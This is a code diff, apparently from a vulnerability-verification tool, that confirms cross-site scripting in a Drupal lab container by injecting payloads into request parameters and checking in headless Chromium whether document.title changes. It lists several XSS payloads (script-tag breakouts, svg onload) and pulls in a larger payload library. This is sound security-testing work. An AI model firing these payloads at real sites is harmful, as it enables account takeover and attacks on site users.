@@ -34,10 +34,10 @@ from dataclasses import dataclass
 from typing import Callable, List, Optional
 
 from .wpverify import (WpVerifyResult, _docker_daemon_ok, _lab_host, _pick_param,
-                       _redirect_location_is_external, _token,
+                       _redirect_location_is_external, _token, _XssBrowserSession,
                        _ID_HINTS, _EMAIL_HINTS, _PASS_HINTS, _PATH_HINTS, _CMD_HINTS, _SQLI_HINTS,
-                       _URL_HINTS, _XSS_HINTS, _XML_HINTS, _REDIRECT_HINTS, _FILE_UPLOAD_HINTS,
-                       _xss_render)
+                       _URL_HINTS, _XSS_HINTS, _XML_HINTS, _REDIRECT_HINTS, _FILE_UPLOAD_HINTS)
+from .payload_kb import load_xss_payloads
 
 _MYSQL_IMAGE = "mysql:5.7"
 _DRUPAL_DRUSH_IMAGE = "binoracle-drupal-drush:10"
@@ -1140,22 +1140,27 @@ def verify_drupal_xss(
             f"';{js};//", f'";{js};//', f"</script><script>{js}</script>",
             f"<ScRiPt>{js}</sCrIpT>", f"<svg/onload=\"{js}\">",
         ]
+        attempts += load_xss_payloads(js)
 
         m = (http_method or "GET").upper()
         found = False
         tried = []
-        for payload_value in attempts:
-            params = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
-            params[xss_param] = payload_value
-            step(f"probando {m} {endpoint} con {xss_param}={payload_value!r} (navegador real)...")
-            title, _png = _xss_render(boot.base_url, endpoint, m, params, cookies)
-            tried.append({"payload": payload_value, "title_resultante": title})
-            if title == marker:
-                found = True
-                res.evidence["payload_ganador"] = payload_value
-                step(f"VERIFICADO: el navegador EJECUTO el script inyectado -- document.title "
-                     f"cambio exactamente a '{marker}'.")
-                break
+        # UN SOLO navegador para todos los intentos (ver _XssBrowserSession en wpverify.py) --
+        # arrancar un Chromium por payload, con las ~500+ variantes de payload_kb.py sumadas,
+        # tarda minutos; el coste real es el arranque del propio navegador.
+        step(f"arrancando Chromium headless (se reutiliza para los {len(attempts)} intentos)...")
+        with _XssBrowserSession() as xb:
+            for payload_value in attempts:
+                params = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+                params[xss_param] = payload_value
+                title, _png = xb.render(boot.base_url, endpoint, m, params, cookies)
+                tried.append({"payload": payload_value, "title_resultante": title})
+                if title == marker:
+                    found = True
+                    res.evidence["payload_ganador"] = payload_value
+                    step(f"VERIFICADO: el navegador EJECUTO el script inyectado -- document.title "
+                         f"cambio exactamente a '{marker}'.")
+                    break
         res.evidence.update({"login_bajo_privilegio": boot.sub_user,
                              "login_bajo_privilegio_password": boot.sub_pass,
                              "xss_param": xss_param, "token": token, "metodo": m,
